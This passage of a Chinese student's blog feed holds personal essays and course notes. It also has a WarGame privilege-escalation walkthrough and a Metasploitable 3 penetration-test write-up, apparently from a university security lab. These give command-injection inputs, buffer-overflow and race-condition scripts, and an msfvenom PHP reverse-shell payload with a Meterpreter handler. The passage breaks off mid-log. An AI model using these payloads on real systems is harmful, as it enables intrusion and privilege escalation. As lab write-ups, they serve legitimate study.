class="line">像我这样寻找的人</span><br><span class="line">像我这样碌碌无為的人</span><br><span class="line">你还见过多少人</span><br><span class="line"></span><br><span class="line">像我这样孤单的人</span><br><span class="line">像我这样傻的人</span><br><span class="line">像我这样不甘平凡的人</span><br><span class="line">世界上有多少人</span><br><span class="line"></span><br><span class="line">像我这样莫名其妙的人</span><br><span class="line">会不会有人心疼</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>某个时期，生活紧绷，无法停止的脚步，停下便焦虑的心律。<br>那时的我，时常会听这首歌。<br>它缓解了我的压力，无法完美处理的情绪。<br>将我的手足无措释放，安置在它该存在的地方。<br>它用悲伤，抚平了我的伤悲。</p><p>当奋力过后，迎来的却是空虚。<br>当奔跑的过程，却听见许多不安与质疑。<br>而那些质疑，不是爱碎嘴的路人，不是一知半解的友人，不是固执己见的亲人。</p><p>是你，是你自己本人。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MindSpore</title>
      <link href="/2022/01/25/MindSpore/"/>
      <url>/2022/01/25/MindSpore/</url>
      
        <content type="html"><![CDATA[<h1>MindSpore Winter Camp</h1><p>华为寒假MindSpore实践课，作为听课的为数不多的大二同学，12h速成DNN…听起来蛮吓人的</p><p>华为讲的还是可以的，老师准备很充分，资源配备也很好，云服务器体验实在太顶了，那模型我本机十几天都不一定训练的出来</p><p>资料都整理在<a href="https://github.com/StantonJoY/NJU-SE-Notes/tree/main/WinterSchool%20DNN">仓库</a></p><p>一点点文档没有的知识记录：</p><ul><li><p>特征图大小：(n+2p-f)/s +1向下取整</p><p>n：边长</p><p>p：填充（padding）</p><p>f：filter边长</p><p>s：步长（stride）</p><p>因此代码中全连接时数据都是经过上述公式计算的，不是随便填的</p></li><li><p><code>net_loss = nn.SoftmaxCrossEntropyWithLogits(sparse=True, reduction='mean')</code></p><p>sparse指不对数据进行<a href="https://zhuanlan.zhihu.com/p/37471802">One-Hot编码</a></p><p>标签编码的问题是它假定类别值越高，该类别更好，对于编号1、2、3，会有1 + 3 = 4，4 / 2 = 2，将类别之间建立起错误地关联</p></li></ul><p>完成那些任务居然还给发了个证书，小开心~</p><p><img src="https://s2.loli.net/2022/05/03/2ZyqmeDkiXKIFHN.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>COA</title>
      <link href="/2022/01/25/COA%E4%B8%8A%E6%9C%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/25/COA%E4%B8%8A%E6%9C%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>复习折磨的COA上机考试整理的流程图，删去可惜，留与有缘人</p><p><img src="https://s2.loli.net/2022/05/03/7ZsmHSqyJwTp9rI.png" alt="Transformer"></p><p><img src="https://s2.loli.net/2022/05/03/yeXNRzb6Tf7OBtQ.png" alt="ALU"></p><p><img src="https://s2.loli.net/2022/05/03/A1r9toHin2bOxgj.png" alt="FPU"></p><p><img src="https://s2.loli.net/2022/05/03/PvuWEgdL9AenhYK.png" alt="NBCD"></p><p><img src="https://s2.loli.net/2022/05/03/m3ZbJYvrzK6MacH.png" alt="MMU"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔</title>
      <link href="/2021/12/17/21.12.11%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/12/17/21.12.11%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>十二月初冬的天气，傍晚五六点的光景，正是云霞最好看的时候，夕阳遥遥悬在天边，飘着几朵碎云，被染成金红金红的，金得璀璨夺目，红得明艳动人</p><p>但这是一种，没有意义的美</p><p>没有意义在哪？</p><p>没有意义在，我既没有值得分享的人，也不想驻足拍下来把这一刻留住</p><p>学会把这些片刻写下来，而不是再去试图告诉谁</p><p>今天的晚霞很美，虽然它跟昨天前天，明天后天，或者无数个以前以后并没有什么不同</p><p>它一点都不特别</p><p>只是我吹着晚风，迎着人潮汹涌，走在街上，转头看向那晚霞的时候</p><p>感到莫名的萧索</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WarGame闯关笔记</title>
      <link href="/2021/12/17/WarGame/"/>
      <url>/2021/12/17/WarGame/</url>
      
        <content type="html"><![CDATA[<h1>WarGame简介</h1><p><a href="https://box.nju.edu.cn/d/10484f123139461d9412/">虚拟机及题目链接</a></p><p>WarGame提供的虚拟机镜像是一个基于 Linux 的漏洞挖掘的练习闯关平台。闯关者需要从中找到漏洞并突破权限。相信在完成该平台的练习后，你将对漏洞挖掘的原理有一个较为透彻的理解，并掌握漏洞挖掘的基本方法。</p><p>该平台的每一个关卡对应一个名为 levelXX 的账号，密码与账号名相同。在完成每一关 的 题 目 之 前 ， 你 需 要 用 对 应 的 账 号 登 录 系 统 。 每 个 关 卡 的 题 目 对 应 的 文 件 都 放 在 /home/flagXX 目录中。例如，第一关的账号名是 level01，密码也是 level01，如果这个关卡 有需要攻击的包含漏洞的程序，那么相应的程序就放在/home/flag01 目录中。每个关卡的内 容介绍和相关程序的源代码可以在本实验讲义后面对应的 Level 小节中获得。<br>/home/flagXX 目录中的程序具备 SUID 权限。例如在关卡 level01 中，用 level01 账号登 录进系统，然后执行/home/flag01/flag01，程序将以 flag01 的身份运行。当你利用该程序的 漏洞提升自己的权限后，你的身份就将变为 flag01。提权成功后，你需要执行/bin/getflagXX 程序（对本例来说，就是执行/bin/getflag01），如果你确实是以 flagXX 的身份运行该程序， 就将获得提示：“Congratulation! The flag is xxx-xxx”，否则获得的提示为：“Wrong, You are in  a  non-flag  account”。每个关卡的最终目的就是利用程序漏洞提升自己的权限，然后想办 法执行/bin/getflagXX 程序并获得 flag。</p><h1>Level00</h1><p>查找具有SUID权限的程序，找到 /bin/…/flag00: find / -perm /4000</p><p>PS：老师是不是发虚拟机之前调用了flag00，历史指令按两下就出现了flag00，不过这大概不能算是另一种做法吧~</p><p><img src="https://s2.loli.net/2021/12/17/8OpRzalEdNQXHcm.png" alt="00"></p><h1>Level01</h1><ol><li>在用户目录下创建符号链接echo, 链接到getflag: ln -s /bin/getflag01 ~/echo</li><li>将自己的用户目录添加到环境变量中: export PATH=/home/level01/:$PATH</li><li>执行flag01, 它会帮我们运行 /bin/getflag01</li></ol><p><img src="https://s2.loli.net/2021/12/17/sV9kgcCtlev1Eox.png" alt="01"></p><h1>Level02</h1><ol><li>修改用户名, 使其闭合前一个语句并在后面执行getflag: export USER=“name &amp;&amp; /bin/getflag02 &amp;&amp;”</li><li>执行flag02</li></ol><p><img src="https://s2.loli.net/2021/12/17/eiB3xrV5taovC4M.png" alt="02"></p><h1>Level03</h1><ol><li>在用户目录下写一个getflag( /bin/getflag03 &gt; ~/flag), 将它拷贝到漏洞目录下</li><li>等待一会crontab执行, 查看获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/XxwEAyrfPTRWchu.png" alt="03"></p><h1>Level04</h1><ol><li>在用户目录下创建链接至/home/flag04/token</li><li>执行flag04, 查看token</li><li>切换到用户flag04, 执行/bin/getflag04</li></ol><p><img src="https://s2.loli.net/2021/12/17/43lnuvaASCTp7mK.png" alt="04"></p><h1>Level05</h1><ol><li>将压缩包解压到用户目录下: tar zxvf backup-2017.tar.gz -C ~/</li><li>使用ssh密钥登录flag05: ssh -i .ssh/id_rsa <a href="mailto:flag05@192.168.195.128">flag05@192.168.195.128</a></li><li>运行/bin/flag05获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/5zaHnPuKIGVdlhJ.png" alt="05"></p><h1>Level06</h1><ol><li>查看/etc/passwd, 发现flag06密码的密文存在了这里</li><li>使用kali的john插件进行破解, 得到flag06的密码 ftc</li><li>登录用户flag06, 运行/bin/getflag06</li></ol><p><img src="https://s2.loli.net/2021/12/17/JIARGCDTc7Y5kKg.png" alt="06"></p><h1>Level07</h1><ol><li>index.cgi监听端口8888, CGI采用get方法响应请求, 该程序传输 Host参数</li><li>构造语句闭合ping命令( ||/bin/getflag07)</li></ol><p><img src="https://s2.loli.net/2021/12/17/2Xz7KtonCUbvw1O.png" alt="07"></p><h1>Level08</h1><ol><li>使用nc将capture.pcap传到kali:<ul><li>靶机 nc -lp 4455 &lt; capture.pcap -q 1</li><li>攻击机 nc -nv 192.168.1.233 4455 &gt; cap.pcap</li></ul></li><li>使用Wireshark进行分析, 追踪TCP流, 得到Password: backd00Rmate</li><li>登录flag08, 执行/bin/getflag08得到flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/irc9RutBzyMflPw.png" alt="08"></p><h1>Level09</h1><ol><li><p>注意到代码</p><p><code>$contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);</code></p><p>preg_replace第一参数使用了**/e模式**，preg_replace的第二个参数会作为代码执行。</p></li><li><p>用php中的system函数执行外部的shell命令，将<code>[email &quot;&#123;$&#123;system(getflag)&#125;&#125;&quot;]</code>写入/tmp/atk</p></li><li><p>./flag19 /tmp/atk 获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/xtDB1MIp5dhWG6j.png" alt="09"></p><h1>Level10</h1><ol><li><p>flag10程序判断用户是否拥有读该文件的权限, 如果有, 通过18888端口发送给指定host</p></li><li><p>kali机永久监听18888端口, 并将内容输出到log: ncat -lp 18888 -k &gt;&gt; log</p></li><li><p><a href="http://xn--switch-of8i52at7oc26duqa348pbqlt0g.sh">编写条件竞争脚本switch.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line"> ln -s /home/level10/null /home/level10/fake</span><br><span class="line"> unlink /home/level10/fake</span><br><span class="line"> ln -s /home/flag10/token /home/level10/fake</span><br><span class="line"> unlink /home/level10/fake</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p><a href="http://xn--start-by5hv20kj82bz1djuwxpt.sh">编写运行脚本start.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">/home/flag10/flag10 /home/level10/fake 192.168.1.114</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p><a href="http://xn--1switch-hc5k0ou4pznijkao938bxh2attx.sh">以1优先级后台运行switch.sh</a>, <a href="http://xn--19start-hc5k1ou4ppz9lsgyavou.sh">以19优先级运行start.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nice -n1 sh switch.sh &amp;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nice -n19 sh start.sh</span></span><br></pre></td></tr></table></figure></li><li><p>在kali机查看log, 得到token( b3c5-6d82-7sfc), 登录flag10, 获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/cPBrLyX13I879Vw.png" alt="10"></p><h1>Level12</h1><ol><li>连接50000端口的lua服务： nc -nv 127.0.0.1 50000</li><li>输入指令闭合语句，获得flag： ; /bin/getflag12 &gt; ~/flag; #</li></ol><p><img src="https://s2.loli.net/2021/12/17/f87u1qP3BDGRkSA.png" alt="12"></p><h1>Level13</h1><ol><li>使用gdb调试程序： gdb ./flag13</li><li>在main中打断点： (gdb) b main</li><li>(gdb) display /20i $pc，查看20行汇编</li><li>运行，然后单步调试到 ”=&gt; 0x080484f4 &lt;+48&gt;:    cmp eax, 0x3e8“</li><li>修改寄存器eax的值为0x3e8： (gdb) set $eax=0x3e8</li><li>继续执行得到token（b705702b-76a8-42b0-8844-3adabbe5ac58），登录flag13获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/YIGEpuAU2cn3bm6.png" alt="13"></p><h1>Level14</h1><ol><li>运行flag14，观察发现加密算法是 str[i] += i;</li><li>将加密的token进行解密，得到 318d229.998d.5f</li><li>登录flag14，获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/WIqh7TVeHaybcUL.png" alt="14"></p><h1>Level16</h1><ol><li><p>编写脚本 /tmp/getflag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">/bin/getflag16 &gt; /tmp/flag</span><br></pre></td></tr></table></figure></li><li><p>写一个html表单，在username中提交 &quot;;a=/tmp/getflag;${a,};</p></li><li><p>查看 /tmp/flag 获得 flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/IKbFR3rsEUimOtk.png" alt="16"></p><h1>level19</h1><ol><li><p>编写脚本，fork一个子进程，然后父进程退出，子进程执行 /home/flag19/flag19</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">char</span>* args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/bin/getflag19&gt;/tmp/flag_19&quot;</span>, <span class="literal">NULL</span>&#125;;  </span><br><span class="line">    <span class="keyword">if</span>(!fork())&#123;</span><br><span class="line">         execve(<span class="string">&quot;/home/flag19/flag19&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;编译链接执行，查看输出获得flag</span><br></pre></td></tr></table></figure></li><li><p>编译链接执行，查看输出获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/JHGR3MuEAkh9mFn.png" alt="19"></p><h1>Level20</h1><ol><li><p>输入65个’a’给flag20程序，造成数组越界，修改modified的值不为0，获得flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..64&#125;;<span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">&#x27;a&#x27;</span> &gt;&gt; /tmp/overflow20;<span class="keyword">done</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /tmp/overflow20 | ./flag20</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/23twKc1QB9SWaVn.png" alt="20"></p><h1>Level21</h1><ol><li><p>越界后修改modified为0x56575859 (也就是 VWXY)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./flag21 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaYXWV</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/Fb864t9OyxkKpe7.png" alt="21"></p><h1>Level22</h1><ol><li><p>编写添加环境变量的脚本 /tmp/atk22.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;export NJUCS=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c&#x27;&quot;</span>, <span class="number">0x0a</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x0d</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译运行，将输出结果添加到 ~/.bashrc 中，刷新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc /tmp/atk22.c -o /tmp/atck22$ /tmp/atk22 &gt;&gt; ~/.bashrc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> ~/.bashrc</span></span><br></pre></td></tr></table></figure></li><li><p>运行 ./flag22 ，获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/Oswi9ESBJHWjD2h.png" alt="22"></p><h1>Level23</h1><ol><li><p>(gdb) x win 查看win函数地址，为 0x804846b</p></li><li><p>编写/tmp/atk23.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c&quot;</span>, <span class="number">0x6b</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>构造payload，运行</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/a4OvYFqQZA1uxRP.png" alt="23"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次完整的渗透测试</title>
      <link href="/2021/12/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/12/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>靶机：metasploitable 3，有许多漏洞供练习，并藏有15个隐藏彩蛋，老师发的镜像删去了部分有损坏的flag</p><h1>一、信息搜集阶段</h1><ol><li><p>通过nmap扫描发现window靶机的ip地址<code>10.0.2.4</code>，PS：kali攻击机ip：10.0.2.15</p></li><li><p>启动msfconfig，使用nmap扫描全端口，发现靶机开启了如下端口，及其服务版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -a win08-r2</span><br><span class="line">[*] Added workspace: win08-r2</span><br><span class="line">[*] Workspace: win08-r2</span><br><span class="line">msf &gt; db_nmap -sS -sV -sC -p- -n -v 10.0.2.4</span><br><span class="line">msf &gt; services </span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line">host      port   proto  name        state  info</span><br><span class="line">----      ----   -----  ----        -----  ----</span><br><span class="line">10.0.2.4  21     tcp    ftp         open   Microsoft ftpd</span><br><span class="line">10.0.2.4  22     tcp    ssh         open   OpenSSH 7.1 protocol 2.0</span><br><span class="line">10.0.2.4  80     tcp    http        open   Microsoft IIS httpd 7.5</span><br><span class="line">10.0.2.4  1617   tcp    java-rmi    open   Java RMI</span><br><span class="line">10.0.2.4  3000   tcp    http        open   WEBrick httpd 1.3.1 Ruby 2.3.1 (</span><br><span class="line">                                           2016-04-26)</span><br><span class="line">10.0.2.4  4848   tcp    ssl/http    open   Oracle Glassfish Application Ser</span><br><span class="line">                                           ver</span><br><span class="line">10.0.2.4  5985   tcp    http        open   Microsoft HTTPAPI httpd 2.0 SSDP</span><br><span class="line">                                           /UPnP</span><br><span class="line">10.0.2.4  8022   tcp    http        open   Apache Tomcat/Coyote JSP engine</span><br><span class="line">                                           1.1</span><br><span class="line">10.0.2.4  8080   tcp    http        open   Sun GlassFish Open Source Editio</span><br><span class="line">                                           n  4.0</span><br><span class="line">10.0.2.4  8282   tcp    http        open   Apache Tomcat/Coyote JSP engine</span><br><span class="line">                                           1.1</span><br><span class="line">10.0.2.4  8484   tcp    http        open   Jetty winstone-2.8</span><br><span class="line">10.0.2.4  8585   tcp    http        open   Apache httpd 2.2.21 (Win64) PHP/</span><br><span class="line">                                           5.3.10 DAV/2</span><br><span class="line">10.0.2.4  9200   tcp    wap-wsp     open</span><br><span class="line">10.0.2.4  49153  tcp    msrpc       open   Microsoft Windows RPC</span><br><span class="line">10.0.2.4  49154  tcp    msrpc       open   Microsoft Windows RPC</span><br><span class="line">10.0.2.4  49179  tcp    java-rmi    open   Java RMI</span><br><span class="line">10.0.2.4  49180  tcp    tcpwrapped  open</span><br></pre></td></tr></table></figure></li></ol><h1>二、漏洞分析与利用阶段</h1><h2 id="（1）WebDAV服务漏洞"><a class="header-anchor" href="#（1）WebDAV服务漏洞">¶</a>（1）WebDAV服务漏洞</h2><p>通过kali提供的WebDAV服务漏洞利用工具DAVTest。该工具会自动检测权限，寻找可执行文件的权限。一旦发现，用户就可以上传内置的后门工具，对服务器进行控制。同时，该工具可以上传用户指定的文件，便于后期利用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root💀kali)-[~]</span><br><span class="line">└─# davtest -url http://10.0.2.4:8585/uploads/                                                              </span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN            SUCCEED:                http://10.0.2.4:8585/uploads</span><br><span class="line">********************************************************</span><br><span class="line">NOTE    Random string for this session: TUv6QRb</span><br><span class="line">********************************************************</span><br><span class="line"> Creating directory</span><br><span class="line">MKCOL           SUCCEED:                Created http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb</span><br><span class="line">********************************************************</span><br><span class="line"> Sending test files</span><br><span class="line">PUT     php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php</span><br><span class="line">PUT     cgi     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cgi</span><br><span class="line">PUT     shtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.shtml</span><br><span class="line">PUT     jhtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jhtml</span><br><span class="line">PUT     aspx    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.aspx</span><br><span class="line">PUT     jsp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jsp</span><br><span class="line">PUT     html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html</span><br><span class="line">PUT     txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt</span><br><span class="line">PUT     pl      SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.pl</span><br><span class="line">PUT     asp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.asp</span><br><span class="line">PUT     cfm     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cfm</span><br><span class="line">********************************************************</span><br><span class="line"> Checking for test file execution</span><br><span class="line">EXEC    php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php</span><br><span class="line">EXEC    cgi     FAIL</span><br><span class="line">EXEC    shtml   FAIL</span><br><span class="line">EXEC    jhtml   FAIL</span><br><span class="line">EXEC    aspx    FAIL</span><br><span class="line">EXEC    jsp     FAIL</span><br><span class="line">EXEC    html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html</span><br><span class="line">EXEC    txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt</span><br><span class="line">EXEC    pl      FAIL</span><br><span class="line">EXEC    asp     FAIL</span><br><span class="line">EXEC    cfm     FAIL</span><br></pre></td></tr></table></figure><p>检测发现可以上传php文件</p><p>生成攻击载荷并上传：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=6666 -f raw &gt;demon.php</span><br><span class="line"></span><br><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ davtest -url http://10.0.2.4:8585/uploads/ -uploadfile demon.php -uploadloc DavTestDir_12ja05EL/66.php</span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN            SUCCEED:                http://10.0.2.4:8585/uploads</span><br><span class="line">********************************************************</span><br><span class="line"> unless  Uploading file</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 10.0.2.15</span><br><span class="line">LHOST =&gt; 10.0.2.15</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.2.15:8888 </span><br><span class="line">[*] Meterpreter session 1 opened (10.0.2.15:8888 -&gt; 10.0.2.4:49914 ) at 2021-12-22 06:41:03 -0500</span><br></pre></td></tr></table></figure><p>得到Meterpreter，成功！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 